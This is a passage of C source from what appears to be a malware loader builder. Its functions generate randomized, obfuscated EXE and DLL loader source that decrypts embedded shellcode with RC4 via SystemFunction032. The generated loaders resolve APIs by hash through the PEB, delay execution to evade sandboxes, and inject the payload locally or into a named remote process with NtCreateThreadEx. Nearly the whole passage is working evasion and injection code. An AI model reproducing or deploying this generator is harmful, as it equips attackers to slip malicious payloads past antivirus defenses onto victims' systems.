        "    p%s((HANDLE)-1, &address, &Spayload, PAGE_READWRITE, &old_protection);\n"
        "    memcpy(address, %s, Spayload);\n"
        "    RC4_Guard(HINT_BYTE, %s, address, sizeof(%s), Spayload);\n"
        "    p%s((HANDLE)-1, &address, &Spayload, PAGE_EXECUTE_READ, &old_protection);\n"
        "    p%s(&hthread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, FALSE, 0, 0, 0, NULL);\n"
        "    p%s(hthread, FALSE, &timeout);\n"
        "    p%s(hthread);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntb = %s(%s);\n"
        "    %s p%s = (%s)%s(ntb, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtProtectVirtualMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntprotectvirtualmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        messageboxa_hash_name,
        random_obf_func,
        xkey, obfuscated_fun, random_user32_name, obfuscated_user32,
        random_payload_name, shellcodeArray,
        random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func, random_user32_name, random_user32_name,
        random_getproc_name, pLoadLibraryA_name, random_user32_name, messageboxa_hash_name,
        NtProtectVirtualMemory_typedef, pNtProtectVirtualMemory_name, NtProtectVirtualMemory_typedef, random_getproc_name, ntprotectvirtualmemory_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtProtectVirtualMemory_name,
        random_payload_name, random_key_name, random_key_name,
        pNtProtectVirtualMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_delay_func,
        random_inject_func
    );
}
void obf_deley_7_inject_explorar_DLL(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtAllocateVirtualMemory_name[9], pWriteProcessMemory_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pCreateToolhelp32Snapshot_name[9], pProcess32First_name[9], pProcess32Next_name[9];
    char pOpenProcess_name[9], plstrcmpiA_name[9], pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtAllocateVirtualMemory_name, sizeof(pNtAllocateVirtualMemory_name));
    generate_random_string(pWriteProcessMemory_name, sizeof(pWriteProcessMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pCreateToolhelp32Snapshot_name, sizeof(pCreateToolhelp32Snapshot_name));
    generate_random_string(pProcess32First_name, sizeof(pProcess32First_name));
    generate_random_string(pProcess32Next_name, sizeof(pProcess32Next_name));
    generate_random_string(pOpenProcess_name, sizeof(pOpenProcess_name));
    generate_random_string(plstrcmpiA_name, sizeof(plstrcmpiA_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntallocatevirtualmemory_hash_name[11];
    char writeprocessmemory_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11], createtoolhelp32snapshot_hash_name[11];
    char process32first_hash_name[11], process32next_hash_name[11], openprocess_hash_name[11];
    char lstrcmpiA_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntallocatevirtualmemory_hash_name, sizeof(ntallocatevirtualmemory_hash_name));
    generate_random_string(writeprocessmemory_hash_name, sizeof(writeprocessmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));
    generate_random_string(createtoolhelp32snapshot_hash_name, sizeof(createtoolhelp32snapshot_hash_name));
    generate_random_string(process32first_hash_name, sizeof(process32first_hash_name));
    generate_random_string(process32next_hash_name, sizeof(process32next_hash_name));
    generate_random_string(openprocess_hash_name, sizeof(openprocess_hash_name));
    generate_random_string(lstrcmpiA_hash_name, sizeof(lstrcmpiA_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtAllocateVirtualMemory_typedef[12], WriteProcessMemory_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char CreateToolhelp32Snapshot_typedef[12], Process32First_typedef[12], Process32Next_typedef[12];
    char OpenProcess_typedef[12], lstrcmpiA_typedef[12], NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtAllocateVirtualMemory_typedef, sizeof(NtAllocateVirtualMemory_typedef));
    generate_random_string(WriteProcessMemory_typedef, sizeof(WriteProcessMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(CreateToolhelp32Snapshot_typedef, sizeof(CreateToolhelp32Snapshot_typedef));
    generate_random_string(Process32First_typedef, sizeof(Process32First_typedef));
    generate_random_string(Process32Next_typedef, sizeof(Process32Next_typedef));
    generate_random_string(OpenProcess_typedef, sizeof(OpenProcess_typedef));
    generate_random_string(lstrcmpiA_typedef, sizeof(lstrcmpiA_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Random names for additional functions
    char random_rc4guard_func[10], random_findtarget_func[10];
    char random_initialize_func[10], random_start_func[10], random_run_func[10];
    char random_hacked_func[10], random_dllmain_func[10];
    char random_hashstring_func[10], random_memcpy_func[10], random_mymalloc_func[10];

    generate_random_string(random_rc4guard_func, sizeof(random_rc4guard_func));
    generate_random_string(random_findtarget_func, sizeof(random_findtarget_func));
    generate_random_string(random_initialize_func, sizeof(random_initialize_func));
    generate_random_string(random_start_func, sizeof(random_start_func));
    generate_random_string(random_run_func, sizeof(random_run_func));
    generate_random_string(random_hacked_func, sizeof(random_hacked_func));
    generate_random_string(random_dllmain_func, sizeof(random_dllmain_func));
    generate_random_string(random_hashstring_func, sizeof(random_hashstring_func));
    generate_random_string(random_memcpy_func, sizeof(random_memcpy_func));
    generate_random_string(random_mymalloc_func, sizeof(random_mymalloc_func));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* Remotprocess = obf(Rprocess, xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef struct tagPROCESSENTRY32W\n"
        "{\n"
        "    DWORD   dwSize;\n"
        "    DWORD   cntUsage;\n"
        "    DWORD   th32ProcessID;\n"
        "    ULONG_PTR th32DefaultHeapID;\n"
        "    DWORD   th32ModuleID;\n"
        "    DWORD   cntThreads;\n"
        "    DWORD   th32ParentProcessID;\n"
        "    LONG    pcPriClassBase;\n"
        "    DWORD   dwFlags;\n"
        "    WCHAR   szExeFile[MAX_PATH];\n"
        "} PROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* PPROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* LPPROCESSENTRY32W;\n"
        "#define PROCESSENTRY32 PROCESSENTRY32W\n"
        "#define LPPROCESSENTRY32 LPPROCESSENTRY32W\n"
        "#define TH32CS_SNAPPROCESS  0x00000002\n"
        "typedef HANDLE(NTAPI* %s)(DWORD dwFlags, DWORD th32ProcessID);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef HANDLE(NTAPI* %s)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);\n"
        "typedef int(NTAPI* %s)(LPCSTR lpString1, LPCSTR lpString2);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtWriteVirtualMemory)(HANDLE ,PVOID ,PVOID ,ULONG,PULONG);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE, LPVOID, LPCVOID , SIZE_T , SIZE_T* );\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "#define %s                      0x5251037A\n"
        "#define %s                   0xA5E086A2\n"
        "#define %s    0x0B37D3B9\n"
        "#define %s     0x54256ED5\n"
        "#define %s      0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s                    0xF20D7F2A\n"
        "#define %s               0xA4E3F108\n"
        "#define %s             0xB9D893EC\n"
        "#define %s   0x5D3C1742\n"
        "#define %s             0xA00889BE\n"
        "#define %s              0x35DB6F55\n"
        "#define %s                0x2007BE63\n"
        "#define %s                  0xC9B81F21\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pxf[] = {%s};\n"
        "char trf[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "CHAR %s(CHAR C) {\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* %s(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0;\n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD %s(_In_ LPCSTR String) {\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (%s((PCHAR) API))\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0) return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;\n"
        "    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0) return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL %s(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE b = 0;\n"
        "    INT i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)%s(dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey) return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte) break;\n"
        "        else b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char pAd[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)pxf, sizeof(pxf), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(pAd), pxf);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "SIZE_T payload_len = sizeof(%s);\n"
        "int %s(const char* procname) {\n"
        "    PROCESSENTRY32 pe32;\n"
        "    int pid = 0;\n"
        "    HANDLE hProcSnap = p%s(TH32CS_SNAPPROCESS, 0);\n"
        "    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;\n"
        "    pe32.dwSize = sizeof(PROCESSENTRY32);\n"
        "    if (!p%s(hProcSnap, &pe32)) {\n"
        "        p%s(hProcSnap);\n"
        "        return 0;\n"
        "    }\n"
        "    while (p%s(hProcSnap, &pe32)) {\n"
        "        if (p%s(procname, (LPCSTR)pe32.szExeFile) == 0) {\n"
        "            pid = pe32.th32ProcessID;\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    p%s(hProcSnap);\n"
        "    return pid;\n"
        "}\n"
        "int %s(HANDLE hProc, unsigned char* payload, SIZE_T payload_len) {\n"
        "    PVOID address = NULL;\n"
        "    HANDLE hThread = NULL;\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    p%s(hProc, &address, 0, &payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);\n"
        "    p%s(hProc, address, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);\n"
        "    p%s(&hThread, THREAD_ALL_ACCESS, NULL, hProc, address, NULL, 0, 0, 0, 0, 0);\n"
        "    p%s(hThread, FALSE, &timeout);\n"
        "    p%s(hThread);\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(ntdll, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(ntdll, %s);\n"
        "    p%s = (%s)%s(ntdll, %s);\n"
        "    p%s = (%s)%s(ntdll, %s);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s();\n"
        "    int pid = 0;\n"
        "    %s((char*)trf, sizeof(trf), xkey, sizeof(xkey)); \n"
        "    pid = %s(trf);\n"
        "    if (pid) {\n"
        "        HANDLE hProc = p%s(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);\n"
        "        if (hProc != NULL) {\n"
        "            %s(HINT_BYTE, %s, %s, sizeof(%s), sizeof(%s));\n"
        "            %s(hProc, %s, payload_len);\n"
        "            p%s(hProc);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "VOID %s() {\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    %s();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call) {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        CreateToolhelp32Snapshot_typedef,
        Process32First_typedef,
        Process32Next_typedef,
        OpenProcess_typedef,
        lstrcmpiA_typedef,
        NtAllocateVirtualMemory_typedef,
        WriteProcessMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        GetProcAddress_typedef,
        NtDelayExecution_typedef,
        ntdll_hash_name,
        kernel32_hash_name,
        ntallocatevirtualmemory_hash_name,
        writeprocessmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        createtoolhelp32snapshot_hash_name,
        process32first_hash_name,
        process32next_hash_name,
        openprocess_hash_name,
        lstrcmpiA_hash_name,
        random_obf_func,
        xkey,
        obfuscated_fun,
        Remotprocess,
        NtAllocateVirtualMemory_typedef, pNtAllocateVirtualMemory_name,
        WriteProcessMemory_typedef, pWriteProcessMemory_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name,
        NtClose_typedef, pNtClose_name,
        CreateToolhelp32Snapshot_typedef, pCreateToolhelp32Snapshot_name,
        Process32First_typedef, pProcess32First_name,
        Process32Next_typedef, pProcess32Next_name,
        OpenProcess_typedef, pOpenProcess_name,
        lstrcmpiA_typedef, plstrcmpiA_name,
        random_toUpper_name,
        random_mymalloc_func,
        random_hashstring_func,
        random_hashstring_func,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_rc4guard_func,
        random_mymalloc_func,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_payload_name, shellcodeArray,
        random_key_name, keyArray,
        hint,
        random_payload_name,
        random_findtarget_func,
        pCreateToolhelp32Snapshot_name,
        pProcess32First_name,
        pNtClose_name,
        pProcess32Next_name,
        plstrcmpiA_name,
        pNtClose_name,
        random_inject_func,
        pNtAllocateVirtualMemory_name,
        pWriteProcessMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_initialize_func,
        random_getmodule_name, ntdll_hash_name,
        random_getmodule_name, kernel32_hash_name,
        pCreateToolhelp32Snapshot_name, CreateToolhelp32Snapshot_typedef, random_getproc_name, createtoolhelp32snapshot_hash_name,
        pProcess32First_name, Process32First_typedef, random_getproc_name, process32first_hash_name,
        pProcess32Next_name, Process32Next_typedef, random_getproc_name, process32next_hash_name,
        pOpenProcess_name, OpenProcess_typedef, random_getproc_name, openprocess_hash_name,
        plstrcmpiA_name, lstrcmpiA_typedef, random_getproc_name, lstrcmpiA_hash_name,
        pNtAllocateVirtualMemory_name, NtAllocateVirtualMemory_typedef, random_getproc_name, ntallocatevirtualmemory_hash_name,
        pWriteProcessMemory_name, WriteProcessMemory_typedef, random_getproc_name, writeprocessmemory_hash_name,
        pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_start_func,
        random_initialize_func,
            random_obf_func,
        random_findtarget_func,
        pOpenProcess_name,
        random_rc4guard_func, random_key_name, random_payload_name, random_key_name, random_payload_name,
        random_inject_func, random_payload_name,
        pNtClose_name,
        random_run_func,
        random_delay_func,
        random_start_func,
        random_run_func

    );
}
void obf_deley_7_inject_explorar(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
